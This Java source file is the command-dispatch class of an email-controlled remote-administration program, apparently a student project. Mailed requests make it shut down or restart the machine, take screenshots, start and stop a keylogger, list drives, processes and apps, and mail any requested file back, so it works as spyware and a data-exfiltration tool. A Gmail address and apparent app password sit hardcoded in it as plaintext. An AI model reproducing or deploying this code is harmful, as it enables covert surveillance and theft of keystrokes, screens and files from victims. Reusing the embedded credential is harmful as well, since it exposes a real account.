package com.example.project.server;

import com.example.project.features.getfile.GetFile;
import com.example.project.features.keylogger.KeyLog;
import com.example.project.features.list.ListApp;
import com.example.project.features.list.ListPrc;
import com.example.project.features.power.SRS;
import com.example.project.features.screenshot.Screenshot;
import com.example.project.mail.sendMail;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class sendResponse extends Thread{
    final String DEFAULT_MAIL = "projectmangmaytinh2004@gmail.com";
    final String DEFAULT_PASSWORD = "gorabwfzyfuqfkgy";
    int index = 0;
    String key;


    private String getMail(String mail){
        if (!mail.contains(String.valueOf('<'))){
            return mail;
        }
        return mail.substring(mail.indexOf('<')+1,mail.indexOf('>'));
    }

    public sendResponse(String key){
        this.key = key;
    }
    KeyLog kl = new KeyLog();
    @Override
    public void run() {
        if (Server.reqList.isEmpty()){
            return;
        }
        while (index<Server.reqList.size()){
            switch ((Server.reqList.get(index)+" ").substring(0,2)){
                //connect
                case "0 ": {
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    sm.sendContent("Connect Successful");
                    break;
                }
                //shutdown
                case "1 ": {
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    sm.sendContent("Successful");
                    SRS.shutdown();
                    break;
                }
                //restart
                case "2 ": {
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    sm.sendContent("Successful");
                    SRS.restart();
                    break;
                }
                //logout
                case "3 ": {
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    sm.sendContent("Successful");
                    SRS.logout();
                    break;
                }
                //sleep
                case "4 ": {
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    sm.sendContent("Successful");
                    SRS.sleep();
                    break;
                }
                //screenshot
                case "5 ": {
                    Screenshot sc = new Screenshot();
                    File file;
                    file = sc.takeScreenShot();
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    sm.send(file);
                    System.out.println(4);
                    break;
                }
                //start keylog
                case "6 ": {
                    kl.start();
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    sm.sendContent("Successful");
                    System.out.println(1);
                    break;
                }
                //end keylog
                case "7 ": {
                    String text = kl.end();
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    FileWriter fw;
                    try {
                        fw = new FileWriter("keylog.txt");
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    try {
                        fw.write(text);
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    try {
                        fw.close();
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    File file = new File("keylog.txt");
                    sm.send(file);
                    System.out.println(2);
                    break;
                }
                //getfile
                case "8 ": {
                    String text = "Something wrong happened";
                    GetFile gf = new GetFile();

                    if (Server.reqList.get(index).length()<=2){

                        text = gf.listDrive();

                    }
                    else {
                        String path = Server.reqList.get(index).substring(2).strip();
                        File file = new File(path);
                        if (file.isDirectory()){
                            text = gf.listFile(file.getAbsolutePath());
                        }
                        else {
                            if (file.exists()){
                                sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index) + " ok");
                                sm.send(file);
                                break;
                            }
                            else{
                                text = "File do not exist";
                            }
                        }
                    }
                    File file = new File("filelists.txt");
                    FileWriter fw;
                    try {
                        fw = new FileWriter("filelists.txt");
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    try {
                        fw.write(text);
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    try {
                        fw.close();
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    sm.send(file);
                    break;
                }
                //list prc
                case "9 ": {
                    ListPrc la = new ListPrc();
                    File file;
                    try {
                        file = la.run();
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    sm.send(file);
                    System.out.println(3);
                    break;
                }
                //List app
                case "10": {
                    ListApp la = new ListApp();
                    File appList;
                    try {
                        appList = la.run();
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    sm.send(appList);
                    break;
                }
                default: {
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 404");
                    sm.sendContent("Wrong Request");
                    System.out.println(5);
                    break;
                }
            }
            index++;
        }
    }
}
